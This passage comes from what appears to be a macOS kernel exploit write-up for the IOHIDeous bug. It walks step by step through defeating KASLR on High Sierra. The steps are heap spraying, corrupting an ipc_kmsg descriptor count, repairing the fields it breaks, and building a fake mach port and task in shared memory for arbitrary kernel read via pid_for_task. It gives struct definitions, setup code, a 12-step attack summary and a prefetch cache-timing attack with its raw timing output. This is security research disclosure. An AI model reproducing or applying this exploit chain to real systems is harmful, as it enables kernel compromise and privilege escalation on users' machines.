The `if` block is very unlikely to be entered since `_cursorHelper` has just been updated with the values from `evg->cursorLoc`, which are in my experience very unlikely to match those of `evg->desktopCursorFixed` (at least if they're useful in any way). If the `else` branch is entered, `evg->desktopCursorFixed` and `evg->screenCursorFixed` will be written to. Basically if `evg->cursorSema == 0`, `evg->desktopCursorFixed` and `evg->screenCursorFixed` will be written to. This may or may not be a problem, depending on the memory structure we're intersecting with.

Sounds like fun! :P

### Leaking the kernel slide, the tedious way

No matter what we wanna do to the kernel, at some point we're gonna have to defeat KASLR and learn the kernel slide. If we intend to run some ROP, we need that pretty early on even. So how do we get there?

The prime candidates for revealing the kernel slide are usually pointers in some dynamically allocated structures, which point back to the main kernel binary, often to functions, strings, or C++ vtables. With our ability to read 4 bytes of memory off a choosable memory structure, that sounds pretty easy. That is, until you realise that virtually all of those structures are small enough to be handled by zalloc, i.e. we cannot get them to the `kalloc_map` or the `kernel_map`. In fact, I have yet to learn of any object that is or can be made large enough to not be handled by zalloc, and which contains any pointers to the main kernel binary whatsoever. If you know of one, please do tell me!

But let's not despair over that, and instead have a look at what structures we _can_ allocate onto the `kalloc_map` or the `kernel_map`. Here's a list of the ones I know, quite possibly incomplete:

-   Data buffers. Examples include `OSString` or some forms of `IOBufferMemoryDescriptor`.
-   Pointer arrays. Examples are the "buffers" allocated by `OSArray` and `OSDictionary`.
-   `struct ipc_kmsg`. The container within which mach messages are wrapped.

Data buffers contain exclusively user-supplied data, so reading from them is entirely useless, and with writing we could at most break some assumptions that were established through sanitisation earlier, but... meh. Pointer arrays contain exclusively pointers to dynamically allocated objects, so corrupting them might get us code execution if we know an address where we can put a fake object, and reading from them might just tell us where such an address might be once the object is freed. However, neither of those gets us any closer to the kernel slide. That leaves only kmsg's... and boy are kmsg's something! 

Let's take a closer look at kmsg's and to that end, mach messages. When a client sends a mach message, it consists of a _header_ containing the size of the message, destination port, etc., and of a _body_. That body can contain "descriptors", which can be out-of-line memory, an out-of-line array of mach ports, or a single inline mach port. Body space not used up by descriptors is just copied 1:1. That gives us a byte buffer of arbitrary size containing both binary data as well as pointers!  
When a message enters kernelland through the `mach_msg` trap, the kernel allocates one large designated buffer for it with an `ipc_kmsg` header, and copies it there. Then it resolves port names to pointers, translates descriptors, adds a trailer to it that contains information about the sender, and finally adds the kmsg to the message queue of the destination port. Now, the buffer holding the kmsg needs to be significantly larger than the raw mach message, not only due to the kmsg header and the message trailer, but also due to the fact that the size of descriptors is different for 32- and 64-bit contexts. In addition, the function allocating the buffer has no idea whether there will be any descriptors at all or where the message is coming from. It only knows the user-specified message size, so it makes the most protective assumptions, i.e. that small descriptors will have to be translated to big ones, and that the entire message body consists of descriptors. Currently that means for every 12 bytes of body size, the kernel allocates 16 bytes - which means we'll have to take special care of the size if we wanna fill a mach message into a hole we punched into the heap. Now, also due to variable size and because descriptors always precede any non-descriptor data sent in a message, mach messages are aligned to the _end_ of the kalloc'ed buffer rather than to the beginning, and the header is pulled backwards as needed when descriptors are translated. To that end, the `ipc_kmsg` header (which sits at the very beginning of the kalloc allocation btw) has a field `ikm_header`, which points to the header of the mach message.

Knowing all that, how can we use it to our advantage now? Plain reading seems futile at this point, so is _writing_ gonna do us any good? Ian Beer has [previously exploited kmsg's][p0blog] by corrupting the `ikm_size` field in `ipc_kmsg`, leading to a heap overflow allowing both controlled reading and writing. That requires appropriate objects to reside after the kmsg in memory however, which isn't the case for us (otherwise we'd just move `evg` a couple of pages further and mess with those).  
What other values do we have? Most fields are pointers whose corruption would require far-reaching construction of fake objects, and the few that are not are mostly just flat-out copied to userland. `ikm_header->msgh_size` is used for the size of the copy-out, but corrupting that would just yield another heap overflow. We could corrupt `ikm_header` which would allow us to construct an entire custom mach message, however that would require some valid ports pointers at the very least (which we could read off the original mach message one by one, but that's tedious). There is another, much nicer field though, which allows us to get basically the same result with much less effort: `msgh_descriptor_count`.  
Targeting that, we can send a message with a byte buffer and no descriptors, then change `msgh_descriptor_count` from `0` to `1`, and suddenly on receiving the message, the beginning of our byte buffer will be interpreted as a descriptor! :D

The details for this are really simple: `msgh_descriptor_count` is a 32-bit int, we've already looked at how to write 32 bits of memory after offsetting `evg`, and targeting the least significant bit fits nicely with our writing mask of `0x01ff20ff`.

With that figured out, we can create and "send ourselves" anything that a descriptor can describe. The most straightforward choice to me seems a fake mach port with a fake task struct, which will then allow us to read arbitrary memory via `pid_for_task`. This technique has previously been used by [Luca Todesco][qwerty] in the [Yalu102 jailbreak][yalu102], and subsequently by [tihmstar][tihm] and yours truly in [Phœnix][phoenix] and [PhœnixNonce][phnonce].  
Now in order to pull that off, we need an address at which we can put our fake port and task structs. On devices without SMAP, we could just put those in our process memory and do a dull userland dereference. We're not gonna do that though, since for one my MacBook (on which I was developing the exploit for the biggest part) is equipped with SMAP, and secondly because it's always nice to break one more security feature if you can. :P  
Alright, so we need a _kernel_ address - but guess what, we already have one in our kmsg: `ikm_header`! Now, we can't use that _directly_ since the entire kmsg will be deallocated once we receive it, but knowing the size of the message we've sent, we can use `ikm_header` to calculate the address of the `ipc_kmsg` header - and due to the very nature of our exploit, there happens to exist something at a known offset from that address: IOHIDSystem shared memory. So we just made `0x6000` bytes of directly writeable, kernel-adressable memory - for getting exploit data into the kernel, it hardly gets any nicer than that!

So, how does reading `ikm_header` work in detail? Being an address makes it 64 bits wide, which means that we'll have to read it in two steps. Since every reading operation resets `evg`, we'll need to do an entire cycle of deallocating the kmsg, filling the space with buffer memory, offsetting `evg` again, and allocating a new kmsg between the two readings. But if the new kmsg has the same size as the old one and is filled into the same heap hole, then `ikm_header` is gonna hold the same value, so that won't be a problem.  
There is one more thing though: remember the **cursor problem**? To find out how that affects us in this case, let's have a look at the first few members of the `ipc_kmsg` and `EvGlobals` structs:

[![data structure visualisation][img1]][img1]

When reading the top 32 bits of `ikm_header`, they overlay like this:

[![heap diagram][img2]][img2]

`evg->cursorSema` falls onto the bottom 32 bits of `ikm_next`, which is a pointer to another kmsg. Since that one will also have been allocated via `kalloc`, the lower 32 bits of the pointer are exceedingly unlikely to be zeroes, so in this case we should be safe.  
What about the bottom 32 bits of `ikm_header` then?

[![another heap diagram][img3]][img3]

Now `evg->cursorSema` falls onto the padding between `ikm_size` and `ikm_next`. I don't see that being zeroed out anywhere in the code so in theory it could be anything, however in practice I have only ever seen zeroes there (and even if that's not always the case, it remains a possibility). So when we perform our reading operation, `IOHIDSystem::_setCursorPosition` will run through and `evg->screenCursorFixed` and `evg->desktopCursorFixed` will be written to, which intersect with `ikm_importance` and `ikm_inheritance` (marked red in the diagram). That's bad. When we receive the kmsg and `mach_msg_receive_results` is called, it will invoke `ipc_importance_receive` which will lead us to this bit (assuming we don't have a voucher):

```c
if (IIE_NULL != kmsg->ikm_importance) {
    ipc_importance_elem_t elem;

    ipc_importance_lock();
    elem = ipc_importance_kmsg_unlink(kmsg);
#if IIE_REF_DEBUG
    elem->iie_kmsg_refs_dropped++;
#endif
    ipc_importance_release_locked(elem);
    /* importance unlocked */
}
```

Recall that the values written to `evg->screenCursorFixed` and `evg->desktopCursorFixed` depend on the values previously read from `evg->cursorLoc`. Since we're reading a valid pointer, we will write non-zero values there which means that `IIE_NULL != kmsg->ikm_importance` will hold true and the if block will be entered. That will then lead to a call to `ipc_importance_kmsg_unlink`, which is defined as follows:

```c
static ipc_importance_elem_t ipc_importance_kmsg_unlink(ipc_kmsg_t kmsg)
{
    ipc_importance_elem_t elem = kmsg->ikm_importance;

    if (IIE_NULL != elem) {
        ipc_importance_elem_t unlink_elem;

        unlink_elem = (IIE_TYPE_INHERIT == IIE_TYPE(elem)) ?
            (ipc_importance_elem_t)((ipc_importance_inherit_t)elem)->iii_to_task : 
            elem;

        queue_remove(&unlink_elem->iie_kmsgs, kmsg, ipc_kmsg_t, ikm_inheritance);
        kmsg->ikm_importance = IIE_NULL;
    }
    return elem;
}
```

To fully understand what happens to our corrupted fields, we need to look at two macros: `IIE_TYPE` and `queue_remove`:

```c
#define IIE_TYPE(e) ((e)->iie_bits & IIE_TYPE_MASK)
```

```c
#define queue_remove(head, elt, type, field)            \
MACRO_BEGIN                                             \
    queue_entry_t __next, __prev;                       \
                                                        \
    __next = (elt)->field.next;                         \
    __prev = (elt)->field.prev;                         \
                                                        \
    if ((head) == __next)                               \
        (head)->prev = __prev;                          \
    else                                                \
        ((type)(void *)__next)->field.prev = __prev;    \
                                                        \
    if ((head) == __prev)                               \
        (head)->next = __next;                          \
    else                                                \
        ((type)(void *)__prev)->field.next = __next;    \
                                                        \
    (elt)->field.next = NULL;                           \
    (elt)->field.prev = NULL;                           \
MACRO_END
```

So `ipc_importance_kmsg_unlink` will ultimately dereference all of `ikm_importance`, `ikm_inheritance.prev` and `ikm_inheritance.next`, which we corrupt. Due to the conversion between `cursorLoc` and `screenCursorFixed`/`desktopCursorFixed`, there is no way the values we write can be valid pointers again. So we have no choice but to somehow repair what we're breaking with reading before we can receive the kmsg, and the only tool we've got at our disposal to pull this off is `evg`. In order to determine what is and isn't possible, we first have to finalise our plan for how exactly we shape the heap.

In my implementation, I'm first spraying `OSString`s of size `0x3000`. After offsetting `evg` and detecting where it lands, I punch a hole of size `0x30000` (i.e. just deallocate 16 strings) for the kmsg, but before doing so I create at lower addresses 16 other holes of size `0x2d000` (i.e. 15 strings). That way, new allocations of `0x2d000` bytes or less will first fill up those holes before interfering with our plans, and any allocations bigger than `0x30000` bytes are too big for our kmsg hole and will leave us alone anyway.  
Now, what does a kmsg size of `0x30000` bytes imply? Currently on High Sierra, the sizes of `struct ipc_kmsg`, `mach_msg_base_t` and `mach_msg_max_trailer_t` are `0x58`, `0x24` and `0x44` bytes respectively, and we've already seen that the kernel reserves 16 bytes for every 12 bytes of message body size. That means the body part of our kmsg will have to be `0x30000 - 0x58 - 0x24 - 0x44 = 0x2ff40` bytes, so the mach message we send will need a `0x2ff40 / 16 * 12 = 0x23f70` bytes body. Since we don't send any descriptors, that will actually lead to `0x2ff40 - 0x23f70 = 0xbfd0` bytes after the kmsg header being completely unused. That's good, because that lets us do whatever we want with `evg` around the kmsg header without the chance of corrupting anything after it. And due to our hole-punching, there will still be a string buffer of `0x3000` bytes right before it - not quite enough to buffer the full `0x5ae8` bytes of `evg`, but still a lot.

So what can we _actually_ do with `evg` in terms of repairs now? The easiest thing would be if we could just use `evg->eventFlags` to write zeroes. For that, we have to consider both initialisation and kernel usage of the values around `eventFlags`.

[![evg initialisation][img4]][img4]

That looks rather bad. The fact that values so shortly before and after `eventFlags` are initialised to non-zero or unknown values means that when we write `0` four times, at least one of those will be overwritten again. The next best approach (to me anyway) would seem to try and use `cursorSema` initialisation to zero out things - since it's at the very beginning of `evg` there will be no writes before it, so we could just continuously shift `evg` further down in memory until we're after the kmsg header. However if `cursorSema` is zero, the kernel may change it to a non-zero value at any given time. If that happens right before we move `evg` again, we leave a non-zero value and haven't repaired anything. There are some more fields in `evg` that are initialised to zero, most notably in `evg->lleq`, an array of `NXEQElement`s. As far as I can tell, no code in `IOHIDFamily` accesses that memory at all beyond initialisation, and it doesn't seem to be exported to anywhere in kernelland either. That puts kernel writes out of the way and just leaves initialisation:

[![lleq initialisation][img5]][img5]

Since we have an array of those, we can nicely use `lleq[1]` to zero things out while the last 64 bytes of `lleq[0]` will give us enough space to leave the rest of the header intact:

[![lleq zeroing][img6]][img6]

(As is visible, it gives us _only just_ enough space, down to the bit! As if we're blessed with luck or something. :D)  
Using the `sema` and `event.type` fields to zero out, we need to perform three operations in total - two to undo the earlier corruption, and one more because the `next` field writes non-zero values again right before the memory we zero out, which is the lower half of `ikm_importance`. Ultimately we will write a non-zero value to `ikm_qos_override`, but that has no bad consequence. Note we _could_ also have used the last element of `lleq` instead, which gets its `next` field set to zero, but then we would've again had to make sure that we have `0x6000` bytes of mapped memory instead of just `0x3000`, and... meh.

Anyway we can repair the kmsg now, and with that there's nothing standing between us and our fake mach port anymore! Well, except the actual fake port and its kobject, that is. Getting a usable definition of `struct ipc_port` to userland is a bit tedious and requires digging through a dozen headers, but here's the result (to be fair, I had done most of the work for Phœnix/PhœnixNonce already and merely had to update it - also, `kptr_t` is just typedef'ed to `uint64_t`):

```c
typedef struct {
    uint32_t ip_bits;
    uint32_t ip_references;
    struct {
        kptr_t data;
        uint32_t type;
        uint32_t pad;
    } ip_lock; // spinlock
    struct {
        struct {
            struct {
                uint32_t flags;
                uint32_t waitq_interlock;
                uint64_t waitq_set_id;
                uint64_t waitq_prepost_id;
                struct {
                    kptr_t next;
                    kptr_t prev;
                } waitq_queue;
            } waitq;
            kptr_t messages;
            natural_t seqno;
            natural_t receiver_name;
            uint16_t msgcount;
            uint16_t qlimit;
            uint32_t pad;
        } port;
        kptr_t klist;
    } ip_messages;
    kptr_t ip_receiver;
    kptr_t ip_kobject;
    kptr_t ip_nsrequest;
    kptr_t ip_pdrequest;
    kptr_t ip_requests;
    kptr_t ip_premsg;
    uint64_t  ip_context;
    natural_t ip_flags;
    natural_t ip_mscount;
    natural_t ip_srights;
    natural_t ip_sorights;
} kport_t;
```

With `struct task` I was much lazier, only defining what's really necessary (with the exception of `ip_lock`, which isn't actually needed):

```c
typedef struct
{
    struct {
        kptr_t data;
        uint32_t type;
        uint32_t pad;
    } ip_lock; // mutex
    uint32_t ref_count;
    uint8_t pad[OFF_TASK_BSD_INFO - 3 * sizeof(uint32_t) - sizeof(kptr_t)];
    kptr_t bsd_info;
} ktask_t;
```

`OFF_TASK_BSD_INFO` is the offset of the `bsd_info` field in the kernel's task struct, which can be grabbed from the disassembly of `get_bsdtask_info` (here `0x390`):

```
;-- _get_bsdtask_info:
0xffffff80002bccd0      55             push rbp
0xffffff80002bccd1      4889e5         mov rbp, rsp
0xffffff80002bccd4      488b87900300.  mov rax, qword [rdi + 0x390]
0xffffff80002bccdb      5d             pop rbp
0xffffff80002bccdc      c3             ret
```

Now after moving `evg` for the last time, we can zero out the second and third page of our shared memory (I'm avoiding the first page just in case the kernel writes anything there), and initialise the two structures like this (where `shmem_addr` and `shmem_kern` and the userland and kernel addresses of the shared memory, respectively):

```c
kport_t *kport = (kport_t*)(shmem_addr +     pagesize);
ktask_t *ktask = (ktask_t*)(shmem_addr + 2 * pagesize);

kport->ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
kport->ip_references = 100;
kport->ip_lock.type = 0x26;
kport->ip_messages.port.receiver_name = 1;
kport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
kport->ip_messages.port.qlimit   = MACH_PORT_QLIMIT_KERNEL;
kport->ip_kobject = shmem_kern + 2 * pagesize;
kport->ip_srights = 99;

ktask->ref_count = 100;
```

The reference and right counts are just arbitrary numbers high enough to make sure no deallocation is attempted. The two `MACH_PORT_QLIMIT_KERNEL` are there to prevent any accidental message being sent to the port (by simulating a full message queue), which would attempt to dereference the pointer `ip_messages.klist.messages`, which we don't set. Anything else should be fairly straightforward. Now in order to read 4 bytes from an arbitrary kernel address, we merely need to set `bsd_info` to the address we want minus `0x10` bytes (because that's the offset the `pid` field has in `struct proc`) and call `pid_for_task` on it.

At last, we've successfully turned very constrained read and write primitives into full arbitrary read. Now we just need something to read from - we're after the kernel slide, which we still don't know. We only know the addresses of our shared memory and of our kmsg hole. So it'd be nice if we could reuse the latter somehow to learn the slide. We already enumerated what structures we can allocate in such a place:

-   Data buffers.
-   Pointer arrays.
-   `struct ipc_kmsg`.

In the beginning, the problem with pointer arrays was that they would only ever contain pointers to objects allocated on the heap, to where we couldn't follow with our constrained read primitive. With arbitrary read however, things are looking much better! If we allocate, say, an `OSArray`, read the pointer to the first object it contains, and from that address read the first 8 bytes, we get its vtable - which resides in `__CONST.__constdata` and whose address thus reveals the kernel slide. Now we only have to allocate an `OSArray` large enough for its pointer array to reach `0x30000` bytes. One way of achieving this would be to actually allocate an array with 24'576 elements (we could use all `OSBoolean`s to go easy on memory), but we don't even have to. We can take advantage of the binary serialisation format, namely the fact that dictionaries, arrays and sets take a length specifier from userland. Effectively, we can set an `OSArray`'s size to `0x6000` (that is later multiplied by the size of a pointer) but then supply only a single element (I'll call this an "inflated array"). Even if we didn't have all that though, we could ultimately also send a kmsg with an actual port to e.g. an `IOService` object, which would also get us a C++ object pointer.

So in review, we:

1. Spray the `kalloc_map` with `OSString` buffers.
2. Offset `evg`.
3. Read the strings back to find out where it landed.
4. Punch a hole underneath it.
5. Allocate a kmsg into that hole.
6. Read `ikm_header` off it, yielding the shmem kernel address.
7. Repair any damage we've done.
8. Allocate a new kmsg with body bytes corresponding to a port descriptor pointing to somewhere in shared memory.
9. Flip `msgh_descriptor_count` from `0` to `1` so that our bytes are actually interpreted as a descriptor.
10. Construct a fake port and task on the shared memory.
11. Receive the kmsg, thus inserting the fake port into our namespace.
12. Point `fakeport.ip_kobject.bsd_info` to an address and use `pid_for_tak(fakeport)` to read from it.

At that point we could also attach a `vm_map_t` (say, the `kernel_map`) to our fake task to gain full r/w, or swap the fake task out for a fake `IOService` object with a custom vtable, allowing us to call arbitrary kernel code. I'm gonna leave it at leakage of the kernel slide here though.

_This is implemented in [`src/leak/main.c`](https://github.com/Siguza/IOHIDeous/tree/master/src/leak/main.c)._

### Leaking the kernel slide, the cheater's way

_Edit: The technique explained below has for some reason stopped working on macOS High Sierra 10.13.2. I don't know why and I didn't bother to investigate, but the IOHIDFamily vulnerability is still there all the same. So while the `hid` binary in its current state will only work up to 10.13.1, you could just patch together `hid` and `leak` to get everything working on 10.13.2 - or even write a mach-port-based exploit out of `leak`, I hear mach ports are the real deal. :P_

The above is nice and all (and was actually super fun to piece together), but it has a slight drawback: scanning all these `OSString`s to find out where `evg` landed takes a significant amount of time to execute, and that is after getting the `IOHIDUserClient` port. In a real attack scenario, that would mean that if we run on a logout, the user would be confronted with a black screen for quite a bit longer than they'd expect and be comfortable with, and if we run on a shutdown/reboot, we might even get killed before we get our work done (this depends on physical memory size, and is also less likely when targeting the `kalloc_map` but more likely with the `kernel_map`). On top of that, the above way to leak the slide was chronologically the last part of the exploit I wrote. For those reasons we're gonna look at another way to leak the kernel slide, one that can be executed independently of any other part of the exploit: hardware vulnerabilities!

Long story short, we're doing a prefetch cache timing attack [as devised by Gruss et al][prefetch]. I add nothing new to this technique, I merely wrote my own implementation. For those unfamiliar with how it works, the basic vulnerabilities lie in the x86 `prefetchtN` instructions (where `N` can be `1`, `2`, ...). Those were designed as hints to the CPU that the program wants data at some address loaded into a particular cache, but they have a few interesting properties:

- They ignore access permissions of all kinds, allowing even the prefetching of kernel memory (we're still not able to read that from the cache then though).
- They perform a number of address lookup attempts, and stop as soon as they find something. This means that for an unitialised (or evicted) cache, they execute significantly faster for mapped addresses than unmapped ones.
- They silently ignore all errors (not an actual vulnerability, but a nice property).

Interestingly enough, no implementation I found on the web seemed to work for me, so I ended up writing my own. Like in the paper, I target the `prefetcht2` instruction (i.e. the L2 cache), and for every timing I do:

1. Evict the cache.
2. Use `mfence` to synchronise memory accesses.
3. Invoke `prefetcht2`.
4. Use `rdtscp` before and after it to get the time difference.

For eviction I use the L3 cache rather than just the L2, because then misses will have to go to main memory, which leaves a much bigger mark in the time difference (there's also a notable difference when evicting L2, it's just a lot smaller). The most efficient way (I know of) to do that is to allocate a memory block as large as the L3 cache, divide it into parts as large as the cache line size, and do a single memory read on each of those parts. Conveniently, there are two `sysctl` entries `hw.cachelinesize` and `hw.l3cachesize` giving us exactly those sizes.

Now in order to find the kernel base, we just start at address `0xffffff8000000000`, go up to `0xffffff8020000000` in steps of `0x100000` bytes, perform 16 timings at each step and throw in a `sched_yield()` before each timing to minimise external interference. I implemented that in [`data/kaslr.c`](https://github.com/Siguza/IOHIDeous/tree/master/data/kaslr.c), and running it yields the following:

    0xffffff8000000000     32    452     32     32     32     32     32     32     32     32    116     31     28     28     28     31
    0xffffff8000100000    558    232    235    468    232    332    499    335    242    301    239    291    874    369    343    286
    0xffffff8000200000    286    437    446    463    440    434    443    561    443    437    443    443    440    440    452    511
    0xffffff8000300000    446    538    546    286    440    440    499    440    440    451    440    448    437    443    505    543
    0xffffff8000400000    452    469    443    307    307    295    307    443    670    437    475    682    658    788    304    573
    0xffffff8000500000    460    679    440   1116    452    440    496   1642    558    588    443    307    512    874    598    660
    0xffffff8000600000    598    282    318    457    443    461    481    402    454    440    443    461    443    443   1078    605
    0xffffff8000700000    602    647    602    605    591    576    451    715    310    529    310    269   1621    794    307    356
    0xffffff8000800000    453    282    443    279    496    443    800    664    946    834   1107    555    440   1196    334    443
    0xffffff8000900000    454    454    593    555    443    794    449    490    286    440    443    443    443    454    446    463
    0xffffff8000a00000    520    440    561    593    496    552    384    590    588    588    578    608    614   1110    636    380
    0xffffff8000b00000    448    572    280    596    568    600    444    444    712    448    528    456   1296    448    628    452
    0xffffff8000c00000    448    456    584    448    596    452    448    780    276    310    310    443    450    453    456    543
    0xffffff8000d00000    573    453    453    450    540    446    279    471    472    522    472    440    443    472    443    451
    0xffffff8000e00000    461    440    475    310    464    579    464    469    482    454    464    440    614    452    310    472
    0xffffff8000f00000    475    759    461    767    458    443    475    718    475   1514    443   1934    319    708    307   1258
    0xffffff8001000000    443   1033    718    658    454    443    440    620    446   1048    552    741    443    443    454    440
    0xffffff8001100000    440    502    463    446    520    446    443    443    443    443    443    529    529    457    637    437
    0xffffff8001200000    372    278    286    443    443  42659    390    450    279    440    443    447    443    443    446    567
    0xffffff8001300000    564    544    446    440    440    457    443    526    522    517    449    443    440    526    443    455
    0xffffff8001400000    656    469    461    440    472    608   1178    446   1036    443    443    508    461    871    472    440
    0xffffff8001500000    475   1317    437    555    511    451    472    458    593    440    440    472    546    620   1264   1724
    0xffffff8001600000    543    523    711    638    528    437    440    758    555    455    263    369    301   1491    901   1557
    0xffffff8001700000    568    263    553    272    458    266    280    277    676    464    815    570    437    455   1096    930
    0xffffff8001800000    479    301    272    493    558   1361   1311    310   1470    452    290    396    109    280    263    277
    0xffffff8001900000    478    295    602    771    354   1258    865    556     83    190    167    106    109     81    291    325
    0xffffff8001a00000    679    650    791    626    313    266    266    263    266    266    263    274    277    277    277    283
    0xffffff8001b00000    440    103    266    266    274    266    263    269    280    266    263    260    266    280    274    266
    0xffffff8001c00000    443    266    304    277    139    290    759     92    106    269    109    277    106    280    263    106
    0xffffff8001d00000    443    266    269    277    806    266    277    425    269    537    266    277    266    360    277    694
    0xffffff8001e00000    440    263    280    269    266    269    293    266    266    266    277    283    266    277    283    263
    0xffffff8001f00000    582    266    269    266    266    280    266    263    266    269    263    269    266    328    269    274
    0xffffff8002000000    443    847    277    277    298    266    283    274    272    307    277    269    280    274    266    269
    0xffffff8002100000    443    266    280    280    277    269    283    269    475    277    274    266    269    277    517    295
    0xffffff8002200000    443    425    266    283    451    266    272    277    310    316    283    283    283    269    269    266
    0xffffff8002300000    449    266    275    269    446    266    283    298    384    277    277    280    266    322    272    266
    0xffffff8002400000    467    283    269    106     92    106    274    280    280    266    277    280    277    280    266    304
    0xffffff8002500000    454    277    269    269    277    266    269    277    266    266    263    277    490    277    289    286
    0xffffff8002600000    440    440    443    443    443    440    443    440    440    452    440    443    440   1116    443    454
    0xffffff8002700000    948    440    443    599    443    451    280    446    451    454    454    440    464    283    520    514
    0xffffff8002800000    440    443    437    440    476    729    443    443    437    431    422    457    266    432    275    679
    0xffffff8002900000   1101    443    443    443    597    505    443    558    269    440    440    103    446    443    100   1175
    0xffffff8002a00000    540   1063    564    319    800    266    558    741    505    505    502    451    443    558   1524    727
    0xffffff8002b00000   1151    443    440    443    443    443    277    443    440    457    443    440    454    263    443    437
    0xffffff8002c00000    446    280    508    272    508    511    567    519    602    508    546    440    440    443    440    454
    0xffffff8002d00000    481   1010    744    537    440    440    514    443    534    511    673    537    523    263    520    543
    0xffffff8002e00000    443    443    443    451    461    440    484    440    443    457    443    508    540    443    525    440
    0xffffff8002f00000    446    440    449    440    460    449    443    443    440    266    443    440    443    263    443    697
    0xffffff8003000000    440    449    446    443    443    522    443   1447    635   1237    452    440    437    440    443    458
    0xffffff8003100000    443    446    460    440    443    457    446    440    443    440    443    440    440    454    443    443
    0xffffff8003200000    443    457    452    440    446    443    446    454    454    446    443    446    443    461    440    443
    0xffffff8003300000    454    446    446    449    443    469    289    440    460    443    440    664    446    443    446    475
    0xffffff8003400000    437    443    437    443    443    437    443    443    443    440    449    581    446    443    446    443
    0xffffff8003500000    443    440    437    448    443    443    443    461    440    452    440    443    440    457    443    443
    0xffffff8003600000    440    269    277    283    266    280    280    269    269    481    280    266    263    269    266    269
    0xffffff8003700000    451    280    269    280    269    283    272    266    277    280    269    280    277    266    269    310
    0xffffff8003800000    443    266    280    266    266    266    269    277    277    269    266    269    283    266    269    269
    0xffffff8003900000    532    266    266    277    283    272    266    269    266    277    915    277    269    272    277    278
    0xffffff8003a00000    440    269    272    277    269    277    280    552    275    269    277    301    277    289    266    269
    0xffffff8003b00000    452    283    277    269    269    301    280    272    269    269    280    269    280    266    280    266
    0xffffff8003c00000    443    269    277    446    440    277    871    295    280    280    281    266    269    266    277    277
    0xffffff8003d00000    582    277    269    277    269    266    269    280    280    266    269    280    269    269    263    266
    0xffffff8003e00000    440    289    280    266    266    280    280    266    269    266    266    269    269    286    269    274
    0xffffff8003f00000    443    272    269    277    277    266    280    269    266    269    266    277    277    269    283    266
    0xffffff8004000000    443    812    269    280    266    266    263    266    266    266    266    266    298    263    272    277
    0xffffff8004100000    446    266    263    266     95    277    263    266    263    277    266    263    284    472    266    263
    0xffffff8004200000    440    269    266    106    269    269    269    280    277    280    266    277    269    372    280    277
    0xffffff8004300000    443    269    269    269    266    269    280    355    275    272    266    277    272    301    266    269
    0xffffff8004400000    463    266    263    277    277    277    608    275    269     92    266    280    277    266    277    278
    0xffffff8004500000    440    266    266    266    266    266    277    263    304    266    266    266    266    263    277    266
    0xffffff8004600000    446    280    266    274    266    269    266    280    272    588    266    266    263    280    277    266
    0xffffff8004700000    821    266    280    277    277    277    266    269    274    266    266    269    277    591    327    266
    0xffffff8004800000    448    269    706    272    269    272    277    280    266    407     95    266    576    266    269     92
    0xffffff8004900000    590    266    269     92    266    277    266    443    269    434    467    289    269    266    266    269
    0xffffff8004a00000    440    277    263    280    263    281    292    266    266    266    266    277    266    266    263    277
    0xffffff8004b00000    461    266    263    266    277    596    310    274    277    357    266    552    263    472    266    266
    0xffffff8004c00000    481    283    280    266    277    277    269    269    263    277    283    269    269    277    269    283
    0xffffff8004d00000    457    280    266    277    614    266    393    277    277    280    428    277    280    266    272    280
    0xffffff8004e00000    461    283    425    266    277    269    277    280    280    275    266    277    277    283    277    269
    0xffffff8004f00000    443    277    269    277    280    266    269    266    281    277    280    280    266    269    106    269
    0xffffff8005000000    517    266    272    280    290    280    263    277    280    266    266    269    277    443    277    280
    0xffffff8005100000    446    280    266    266    280    269    263    266    280    277    295    277    269    277    266    304
    0xffffff8005200000    443    277    277    283    266    269    277    269    277    272    269    280    283    275    277    277
    0xffffff8005300000    464    287    269    269    280    106    295    266    266    266    283    266    277    277    269    269
    0xffffff8005400000    511    272    277     95    266    269    266    269    280    263    277    269    280    277    277    298
    0xffffff8005500000    457    449    446    543    546    546    543    629    543    543    543    449    466    446    443    451
    0xffffff8005600000    446    457    443    526    460    443    443    443    528    449    446    443    443    443    443    469
    0xffffff8005700000    454    446    443    443    446    443    466    440    449    443    446    440    519    511    446    522
    0xffffff8005800000    443    440    452    446    451    443    443    443    440    443    472    443    443    454    475    454
    0xffffff8005900000    440    461    446    440    440    434    446    440    464    446    443    443    443    446    443    443
    0xffffff8005a00000    534    460    446    446    457    446    443    443    443    454    499    446    446    440    443    443
    0xffffff8005b00000    460    454    440    446    517    457    443    446    443    457    457    443    443    499    440    449
    0xffffff8005c00000    440    440    443    454    446    443    454    738    440    440    437    443    454    440    440    443
    0xffffff8005d00000    440    457    378    437    520    856    523    523    443    443    443    454    476    440    475    446
    0xffffff8005e00000    440    280    266    266    103    295    269    283    266    277    280    269    292    322    266    277
    0xffffff8005f00000    626    266    343    272    269    287    284    269    280    280    295    269    263    266    266    269
    0xffffff8006000000    454    904    443    266     92    103    277    304    266    266    266    266    280    280    266    280
    0xffffff8006100000    440    266    443    273    313    269    279    106    276    282    418    112    266    106    263    273
    0xffffff8006200000    446    276    276    269    273    273    269    269    273    273    266    266    328    103    280    266
    0xffffff8006300000    587    266    266    266    336    263    266    331    266    266    109     99    102    276    266    266
    0xffffff8006400000    446    440    269    280    280    269    558    269    266    266    269    277    467    104    269    272
    0xffffff8006500000    443    263    277    363    277    280    277    342    274    263    269    280    277    263    277    328
    0xffffff8006600000    446    443    443    451    440    443    443    451    440    455    440    446    440    440    440    440
    0xffffff8006700000    443    440    443    440    277    691    448    277    440    667    561    912    443    451    451    440
    0xffffff8006800000    540    440    440    446    451    443    277    434    443    443    467    484    440    451    785    434
    0xffffff8006900000    437    528    540    570    529    526    543    440    266    440    448    440    434    443    437    443
    0xffffff8006a00000    451    451    443    443    437    440    454    440    458    443    440    596    461    440    448    443
    0xffffff8006b00000    440    599    263    457    632    443    443    443    269    446    632    443    440    451    443    475
    0xffffff8006c00000    440    499    451    440    443    440    443    440    437    448    454    564    478    481    464    487
    0xffffff8006d00000    443    454    499    434    437    272    440    667    454   1060    472    443    487    437    437    451
    0xffffff8006e00000    440    446    647    440    437    443    454    269    440    304    440    446    440    440    437    437
    0xffffff8006f00000    446    440    437    272    443    451    499    771    440    443    440    440    440    440    452    454
    0xffffff8007000000    437    440    540    452    434    448    440    440    437    437    493    434    437    434    437    440
    0xffffff8007100000    440    437    443    437    434    266    437    277    437    263    437    437    434    585    451    437
    0xffffff8007200000    443    446    440    443    443    437    440    266    481    570    451    440    440    440    443    440
    0xffffff8007300000    451    454    440    440    437    440    451    443    443    451    454    437    440    437    440    449
